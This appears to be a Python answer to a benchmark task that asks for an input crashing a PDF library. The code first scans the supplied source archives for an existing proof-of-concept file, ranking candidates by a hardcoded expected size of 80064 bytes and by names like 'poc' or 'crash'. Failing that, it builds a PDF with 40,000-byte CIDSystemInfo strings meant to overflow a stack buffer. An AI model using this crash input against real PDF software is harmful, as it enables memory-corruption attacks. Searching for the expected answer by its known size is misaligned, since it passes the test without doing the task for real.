import os
import io
import tarfile
import zipfile
import gzip
import bz2
import lzma

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Try to locate a PoC in the provided source tarball
        poc = self._find_poc_in_source(src_path)
        if poc is not None:
            return poc
        # Fallback: synthesize a PoC PDF targeting the described vulnerability
        return self._build_pdf_with_long_cid_system_info()

    # ------------------------ Archive scanning utilities ------------------------

    def _is_pdf_header(self, head: bytes) -> bool:
        return head.startswith(b"%PDF-")

    def _read_head(self, stream, n=8) -> bytes:
        try:
            pos = stream.tell()
        except Exception:
            pos = None
        head = stream.read(n)
        # Reset if possible
        try:
            if pos is not None:
                stream.seek(pos)
        except Exception:
            pass
        return head or b""

    def _score_candidate(self, name: str, size: int, head: bytes, target_size: int = 80064):
        lname = name.lower()
        exact_size = 0 if size == target_size else 1
        pdf_header = 0 if self._is_pdf_header(head) else 1
        pocish = 0 if ("poc" in lname or "crash" in lname or "id:" in lname or "repro" in lname) else 1
        pdf_ext = 0 if lname.endswith(".pdf") else 1
        cidish = 0 if ("cid" in lname or "font" in lname) else 1
        absdiff = abs(size - target_size)
        # Score tuple: smaller is better
        return (exact_size, pdf_header, pocish, pdf_ext, cidish, absdiff, size)

    def _find_poc_in_source(self, src_path: str) -> bytes | None:
        # Attempt to open src_path as a tar archive
        try:
            if tarfile.is_tarfile(src_path):
                with tarfile.open(src_path, mode="r:*") as tf:
                    found = self._scan_tar(tf, base_name=os.path.basename(src_path), depth=0)
                    if found is not None:
                        return found
        except Exception:
            pass
        # Attempt to open as a zip archive
        try:
            if zipfile.is_zipfile(src_path):
                with zipfile.ZipFile(src_path, mode="r") as zf:
                    found = self._scan_zip(zf, base_name=os.path.basename(src_path), depth=0)
                    if found is not None:
                        return found
        except Exception:
            pass
        # If it's a directory, scan recursively for files and nested archives
        if os.path.isdir(src_path):
            found = self._scan_directory(src_path, depth=0)
            if found is not None:
                return found
        # If it's a single file (maybe compressed), try to parse nested
        try:
            with open(src_path, "rb") as f:
                buf = f.read()
            found = self._scan_buffer_as_container(buf, name=os.path.basename(src_path), depth=0)
            if found is not None:
                return found
        except Exception:
            pass
        return None

    def _scan_tar(self, tf: tarfile.TarFile, base_name: str, depth: int) -> bytes | None:
        best = None
        best_score = None
        nested_candidates = []

        for m in tf.getmembers():
            if not m.isfile():
                continue
            name = f"{base_name}:{m.name}"
            size = m.size
            head = b""
            try:
                fobj = tf.extractfile(m)
                if fobj:
                    head = self._read_head(fobj, 8)
            except Exception:
                pass

            score = self._score_candidate(name, size, head)
            if best_score is None or score < best_score:
                # Try to read this candidate fully to confirm
                content = None
                try:
                    if size <= 20 * 1024 * 1024:  # 20 MB limit
                        if not fobj:
                            fobj = tf.extractfile(m)
                        if fobj:
                            content = fobj.read()
                except Exception:
                    content = None
                if content is not None:
                    best = content
                    best_score = score

            # Collect nested archives for later scanning
            lname = m.name.lower()
            is_nested = any(
                lname.endswith(ext) for ext in (
                    ".tar", ".tar.gz", ".tgz", ".tar.bz2", ".tbz", ".tbz2", ".tar.xz", ".txz",
                    ".zip", ".gz", ".bz2", ".xz"
                )
            )
            if is_nested and size <= 50 * 1024 * 1024:
                try:
                    fobj2 = tf.extractfile(m)
                    if fobj2:
                        buf = fobj2.read()
                        nested_candidates.append((buf, name))
                except Exception:
                    pass

        # Scan nested archives
        for buf, name in nested_candidates:
            nested = self._scan_buffer_as_container(buf, name=name, depth=depth + 1)
            if nested is not None:
                # Evaluate nested as candidate by rescoring its synthetic name and length
                score = self._score_candidate(name, len(nested), nested[:8])
                if best_score is None or score < best_score:
                    best = nested
                    best_score = score

        return best

    def _scan_zip(self, zf: zipfile.ZipFile, base_name: str, depth: int) -> bytes | None:
        best = None
        best_score = None
        nested_candidates = []

        for info in zf.infolist():
            if info.is_dir():
                continue
            name = f"{base_name}:{info.filename}"
            size = info.file_size
            head = b""
            content = None
            try:
                with zf.open(info, "r") as f:
                    head = self._read_head(f, 8)
                # Read content for best known candidates
                if size <= 20 * 1024 * 1024:
                    with zf.open(info, "r") as f:
                        content = f.read()
            except Exception:
                content = None

            if content is not None:
                score = self._score_candidate(name, size, head)
                if best_score is None or score < best_score:
                    best = content
                    best_score = score

                lname = info.filename.lower()
                is_nested = any(
                    lname.endswith(ext) for ext in (
                        ".tar", ".tar.gz", ".tgz", ".tar.bz2", ".tbz", ".tbz2", ".tar.xz", ".txz",
                        ".zip", ".gz", ".bz2", ".xz"
                    )
                )
                if is_nested and size <= 50 * 1024 * 1024:
                    nested_candidates.append((content, name))

        for buf, name in nested_candidates:
            nested = self._scan_buffer_as_container(buf, name=name, depth=depth + 1)
            if nested is not None:
                score = self._score_candidate(name, len(nested), nested[:8])
                if best_score is None or score < best_score:
                    best = nested
                    best_score = score

        return best

    def _scan_buffer_as_container(self, buf: bytes, name: str, depth: int) -> bytes | None:
        if depth > 3:
            return None
        # If buffer itself looks like a PDF, consider it
        if self._is_pdf_header(buf[:8]):
            return buf
        # Try as tar
        try:
            bio = io.BytesIO(buf)
            with tarfile.open(fileobj=bio, mode="r:*") as tf:
                found = self._scan_tar(tf, base_name=name, depth=depth)
                if found is not None:
                    return found
        except Exception:
            pass
        # Try as zip
        try:
            bio = io.BytesIO(buf)
            with zipfile.ZipFile(bio, mode="r") as zf:
                found = self._scan_zip(zf, base_name=name, depth=depth)
                if found is not None:
                    return found
        except Exception:
            pass
        # Try gzip
        try:
            if buf.startswith(b"\x1f\x8b"):
                decomp = gzip.decompress(buf)
                return self._scan_buffer_as_container(decomp, name=name + "|gunzip", depth=depth + 1)
        except Exception:
            pass
        # Try bzip2
        try:
            if buf.startswith(b"BZh"):
                decomp = bz2.decompress(buf)
                return self._scan_buffer_as_container(decomp, name=name + "|bunzip2", depth=depth + 1)
        except Exception:
            pass
        # Try xz
        try:
            if buf.startswith(b"\xfd7zXZ\x00"):
                decomp = lzma.decompress(buf)
                return self._scan_buffer_as_container(decomp, name=name + "|unxz", depth=depth + 1)
        except Exception:
            pass
        # As a last resort, if buf is small and looks like pdf or name endswith pdf
        if name.lower().endswith(".pdf") and self._is_pdf_header(buf[:8]):
            return buf
        return None

    def _scan_directory(self, root: str, depth: int) -> bytes | None:
        best = None
        best_score = None
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                path = os.path.join(dirpath, fn)
                try:
                    size = os.path.getsize(path)
                except Exception:
                    continue
                head = b""
                try:
                    with open(path, "rb") as f:
                        head = self._read_head(f, 8)
                except Exception:
                    pass
                score = self._score_candidate(path, size, head)
                content = None
                try:
                    if tarfile.is_tarfile(path):
                        with tarfile.open(path, "r:*") as tf:
                            nested = self._scan_tar(tf, base_name=path, depth=depth + 1)
                            if nested is not None:
                                inner_score = self._score_candidate(path, len(nested), nested[:8])
                                if best_score is None or inner_score < best_score:
                                    best = nested
                                    best_score = inner_score
                                continue
                    if zipfile.is_zipfile(path):
                        with zipfile.ZipFile(path, "r") as zf:
                            nested = self._scan_zip(zf, base_name=path, depth=depth + 1)
                            if nested is not None:
                                inner_score = self._score_candidate(path, len(nested), nested[:8])
                                if best_score is None or inner_score < best_score:
                                    best = nested
                                    best_score = inner_score
                                continue
                    if size <= 20 * 1024 * 1024:
                        with open(path, "rb") as f:
                            content = f.read()
                except Exception:
                    content = None
                if content is not None:
                    if best_score is None or score < best_score:
                        best = content
                        best_score = score
        return best

    # ------------------------- Fallback PoC generator ---------------------------

    def _build_pdf_with_long_cid_system_info(self) -> bytes:
        # Construct a minimal but valid PDF that defines a Type0 font with a CIDSystemInfo
        # having extremely long Registry and Ordering strings. This targets the fallback
        # name construction "<Registry>-<Ordering>" in vulnerable code paths.

        # Choose lengths large enough to overflow small fixed-size stack buffers
        reg_len = 40000
        ord_len = 40000
        registry_str = b"A" * reg_len
        ordering_str = b"B" * ord_len

        objects = []
        offsets = []

        def add_obj(num: int, content: bytes):
            nonlocal pdf
            offsets.append(len(pdf))
            pdf += f"{num} 0 obj\n".encode("ascii") + content + b"\nendobj\n"

        # PDF Header
        pdf = b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n"

        # 1 0 obj: Catalog
        obj1 = b"<< /Type /Catalog /Pages 2 0 R >>"
        add_obj(1, obj1)

        # 2 0 obj: Pages
        obj2 = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
        add_obj(2, obj2)

        # 3 0 obj: Page
        obj3 = (
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
            b"/Resources << /Font << /F1 4 0 R >> >> /Contents 8 0 R >>"
        )
        add_obj(3, obj3)

        # 4 0 obj: Type0 Font that references CIDFont (5 0 R)
        obj4 = (
            b"<< /Type /Font /Subtype /Type0 /BaseFont /FAKECID "
            b"/Encoding /Identity-H /DescendantFonts [5 0 R] >>"
        )
        add_obj(4, obj4)

        # 6 0 obj: CIDSystemInfo with very long Registry and Ordering
        # Use literal strings without special characters to avoid escaping issues
        obj6 = (
            b"<< /Registry (" + registry_str + b") "
            b"/Ordering (" + ordering_str + b") "
            b"/Supplement 0 >>"
        )
        add_obj(6, obj6)

        # 7 0 obj: Minimal FontDescriptor
        obj7 = (
            b"<< /Type /FontDescriptor /FontName /FAKECID "
            b"/Flags 4 /FontBBox [0 -200 1000 900] /ItalicAngle 0 "
            b"/Ascent 800 /Descent -200 /CapHeight 700 /StemV 80 >>"
        )
        add_obj(7, obj7)

        # 5 0 obj: CIDFontType0 referencing CIDSystemInfo (6 0 R) and FontDescriptor (7 0 R)
        obj5 = (
            b"<< /Type /Font /Subtype /CIDFontType0 /BaseFont /FAKECID "
            b"/CIDSystemInfo 6 0 R /FontDescriptor 7 0 R /DW 1000 >>"
        )
        add_obj(5, obj5)

        # 8 0 obj: Contents stream referencing F1 to ensure font gets used
        stream_content = b"BT /F1 12 Tf 72 720 Td (Hi) Tj ET"
        stream = b"<< /Length " + str(len(stream_content)).encode("ascii") + b" >>\nstream\n" + stream_content + b"\nendstream"
        add_obj(8, stream)

        # Build xref
        xref_offset = len(pdf)
        num_objs = 8
        xref = [b"xref\n"]
        xref.append(f"0 {num_objs + 1}\n".encode("ascii"))
        xref.append(b"0000000000 65535 f \n")
        for off in offsets:
            xref.append(f"{off:010d} 00000 n \n".encode("ascii"))
        pdf += b"".join(xref)

        # Trailer and EOF
        trailer = (
            b"trailer\n<< /Size " + str(num_objs + 1).encode("ascii") +
            b" /Root 1 0 R >>\nstartxref\n" +
            str(xref_offset).encode("ascii") +
            b"\n%%EOF\n"
        )
        pdf += trailer
        return pdf